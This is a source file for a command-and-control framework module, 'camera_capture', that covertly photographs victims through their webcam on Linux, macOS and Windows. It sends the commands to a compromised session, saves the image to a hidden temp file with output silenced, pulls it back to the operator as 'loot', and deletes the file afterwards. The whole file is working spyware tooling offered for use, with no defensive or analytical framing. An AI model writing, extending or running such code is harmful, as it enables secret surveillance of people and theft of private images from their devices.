// modules/camera_capture.rhai
//
// Captures a single still image from the default webcam,
// saves to a temp file, then queues a download back to the server.
//
// Platform support:
//   Linux   — fswebcam (V4L2), falls back to ffmpeg if fswebcam absent
//   Windows — PowerShell with System.Drawing or ffmpeg
//   macOS   — ffmpeg via avfoundation or imagesnap utility
//
// The captured file lands in loot (downloads/) automatically because
// the agent sends it back via file:read, which the server saves.
//
// Usage: Module tab → camera_capture → Run (or Add to Auto-Recon)

fn run(session_id) {
    let delay = 3; // seconds delay before capture (lets camera auto-adjust exposure)

    // ── Linux ─────────────────────────────────────────────────────────
    // fswebcam: V4L2 default device /dev/video0, JPEG output, no banner.
    // Falls back to ffmpeg with video4linux2 if fswebcam not installed.
    let linux_cap = "bg fswebcam -d /dev/video0 -r 1280x720 --no-banner --jpeg 85 -S " + delay + " /tmp/.cap_img.jpg 2>/dev/null";
    let linux_ffmpeg = "bg ffmpeg -f v4l2 -video_size 1280x720 -i /dev/video0 -vframes 1 -q:v 2 -y /tmp/.cap_img.jpg -loglevel quiet 2>/dev/null";
    let linux_dl  = "file:read|/tmp/.cap_img.jpg";
    let linux_rm  = "shell rm -f /tmp/.cap_img.jpg";

    // ── macOS ──────────────────────────────────────────────────────────
    // imagesnap: purpose-built webcam capture tool for macOS.
    // Requires imagesnap (brew install imagesnap) on target.
    // Falls back to ffmpeg with avfoundation.
    let mac_isnap = "bg imagesnap -d 'FaceTime HD Camera' -w " + delay + " /tmp/.cap_img.jpg 2>/dev/null";
    let mac_ffmpeg = "bg ffmpeg -f avfoundation -framerate 30 -video_size 1280x720 -i \"0\" -vframes 1 -q:v 2 -y /tmp/.cap_img.jpg -loglevel quiet 2>/dev/null";

    // ── Windows ───────────────────────────────────────────────────────
    // PowerShell using System.Drawing to capture from webcam via WIA or DirectShow.
    // Alternative: ffmpeg with dshow (if installed).
    let win_ps = "shell powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"[Reflection.Assembly]::LoadWithPartialName('System.Drawing'); $cam = New-Object -ComObject WIA.CommonDialog; $img = $cam.ShowAcquireImage(); $img.SaveFile([System.IO.Path]::GetTempPath() + '.cap_img.jpg'); Write-Output 'OK'\"";
    let win_ffmpeg = "shell ffmpeg -f dshow -video_size 1280x720 -i video=\"Integrated Camera\" -vframes 1 -q:v 2 -y %TEMP%\\.cap_img.jpg -loglevel quiet 2>nul";
    let win_dl  = "file:read|%TEMP%\\.cap_img.jpg";

    // Send platform variants — platform mismatch errors are silent
    send_c2_command(session_id, linux_cap);
    send_c2_command(session_id, linux_ffmpeg);
    send_c2_command(session_id, mac_isnap);
    send_c2_command(session_id, mac_ffmpeg);
    send_c2_command(session_id, win_ps);
    send_c2_command(session_id, win_ffmpeg);

    // Allow time for camera init + capture before retrieval
    send_c2_command(session_id, "sleep " + (delay + 5));
    send_c2_command(session_id, linux_dl);
    send_c2_command(session_id, win_dl);

    // Clean up temp files after exfiltration
    send_c2_command(session_id, linux_rm);
    send_c2_command(session_id, "shell del /f /q \"%TEMP%\\.cap_img.jpg\" 2>nul");

    print("Camera capture queued for session " + session_id + " (" + delay + "s delay)");
    "Image captured — file will arrive in loot after ~" + (delay + 7) + " seconds"
}